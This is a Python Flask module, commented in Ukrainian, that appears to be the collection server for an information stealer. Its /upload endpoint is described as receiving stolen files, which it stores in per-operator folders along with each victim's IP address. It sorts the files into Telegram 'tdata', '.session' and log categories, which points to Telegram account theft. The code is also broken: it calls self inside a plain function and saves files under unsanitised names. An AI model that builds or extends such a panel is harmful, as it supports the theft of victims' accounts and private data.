from flask import Blueprint, request, jsonify
import os
from datetime import datetime
import logging
from core.database import db_manager
from models.db_models import StolenFile
from core.security import encryption_manager

api_bp = Blueprint('api', __name__)
logger = logging.getLogger(__name__)

@api_bp.route('/upload', methods=['POST'])
def upload_stolen_files():
    """API endpoint для отримання вкрадених файлів"""
    try:
        # Отримуємо дані з запиту
        admin_id = request.form.get('admin_id')
        client_id = request.remote_addr
        files = request.files.getlist('files')
        
        logger.info(f"Received files from {client_id} for admin {admin_id}")
        
        # Створюємо папку для адміна
        admin_upload_dir = f"uploads/stolen_files/{admin_id}"
        os.makedirs(admin_upload_dir, exist_ok=True)
        
        saved_files = []
        
        for file in files:
            if file.filename:
                # Генеруємо унікальне ім'я файлу
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{timestamp}_{file.filename}"
                file_path = os.path.join(admin_upload_dir, filename)
                
                # Зберігаємо файл
                file.save(file_path)
                
                # Записуємо в базу даних
                db_session = db_manager.get_session()
                try:
                    stolen_file = StolenFile(
                        client_id=client_id,
                        ip_address=request.remote_addr,
                        data_type=self._get_file_type(file.filename),
                        file_path=file_path,
                        file_size=os.path.getsize(file_path),
                        admin_id=admin_id
                    )
                    db_session.add(stolen_file)
                    db_session.commit()
                    
                    saved_files.append(filename)
                    logger.info(f"Saved file: {filename} for admin {admin_id}")
                    
                except Exception as e:
                    db_session.rollback()
                    logger.error(f"Database error for file {filename}: {e}")
                finally:
                    db_session.close()
        
        return jsonify({
            'status': 'success',
            'message': f'Received {len(saved_files)} files',
            'files': saved_files,
            'admin_id': admin_id
        })
        
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def _get_file_type(filename: str) -> str:
    """Визначаємо тип файлу"""
    if 'tdata' in filename.lower():
        return 'tdata'
    elif filename.endswith('.session'):
        return 'session'
    elif any(ext in filename.lower() for ext in ['.txt', '.log']):
        return 'logs'
    else:
        return 'other'